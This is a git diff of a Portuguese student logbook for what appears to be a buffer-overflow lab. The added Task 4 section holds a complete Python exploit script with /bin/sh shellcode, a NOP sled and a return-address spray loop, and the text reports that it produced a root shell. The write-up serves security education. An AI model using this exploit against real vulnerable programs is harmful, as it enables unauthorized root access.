@@ -90,7 +90,7 @@ start = 517 - len(shellcode)
 
 <div align="justify">
 <p>Para calcular o offset basta calcular a diferença entre o valor do 'epb' e o endereço de memória do buffer e somar os 4 bytes de distância para o return adress.
-<p> Após isto, tivemos de alterar o valor do 'return adress' ('ret'). Como sabiamos que o 'return adress' teria que retornar para um dos 'NOP' na stack, e que devido as diferenças nos endereços de memória ao executar o program em modo de debug, somar ao valor do 'epb' 8 bytes (que seria o primeiro 'NOP' seguinte) podia causar erros na execução do programa. Tendo isso em mente, somamos ao valor do 'epb' um valor significativo como 110. Assim: </p> 
+<p> Após isto, tivemos de alterar o valor do 'return adress' ('ret'). Como sabiamos que o 'return adress' teria que retornar para um dos 'NOP' na stack, e que devido as diferenças nos endereços de memória ao executar o program em modo de debug, somar ao valor do 'epb' 8 bytes (que seria o primeiro 'NOP' seguinte) podia causar erros na execução do programa. Tendo isso em mente, somamos ao valor do 'epb' um valor significativo como 300. Assim: </p> 
 </div>
 
 ```Python
@@ -149,6 +149,64 @@ with open('badfile', 'wb') as f:
 Por fim, executamos o programa, que provocou um buffer overflow e abriu uma shell com permissões root.
 
 ![Alt text](uploads/logbook5P6.png)
+
+### Task4 - Launching Attack without Knowing Buffer Size
+
+<div align="justify">
+<p> Nesta tarefa, foi nos pedido para alterar o script python de forma a que o ataque fosse executado sem sabermos o tamanho do buffer. Para isso, de forma a obtermos o endereço em memória do buffer, colocamos o seguinte comando no programa 'stack.c':
+
+```C
+printf("Address of buffer: %p\n", buffer);
+```
+O que, após executar o programa, nos deu o seguinte resultado:
+</p>
+</div>
+
+![Alt text](uploads/logbook5P7.png)
+
+<div align="justify">
+<p> Com isto, alteramos o script python de forma a que conseguissemos obter o return adress sem o valor do epb. Assim, criamos um ciclo que incrementava o valor do offset em 4, iniciando em 100 e terminando em 200. De seguida, somamos ao endereço do buffer o offset e somavamos um valor significativo como na task anterior, neste casso 300. Desta forma conseguimos obter o valor do return adress sem utilizar o gdb. Assim o código final ficou da seguinte forma:</p>
+
+```Python
+#!/usr/bin/python3
+
+import sys
+
+# Replace the content with the actual shellcode
+
+shellcode= (
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+
+).encode('latin-1')
+
+# Fill the content with NOP's
+
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+
+# Put the shellcode somewhere in the payload
+
+start = 517 - len(shellcode)               # Change this number 
+
+content[start:start + len(shellcode)] = shellcode
+
+buffer_add = 0xffffca80 #buffer address printed on stack.c code
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+for off in range(100, 200, 4):
+    content[off:off + L] = (buffer_add + off + 300).to_bytes(L,byteorder='little') #trying to find the return address
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+
+```
+
+<p> Após executar o programa, conseguimos obter uma shell com permissões root.</p>
+
+![Alt text](uploads/logbook5P8.png)
 
 # LOGBOOK5 - CTF
 ## Desaio 1
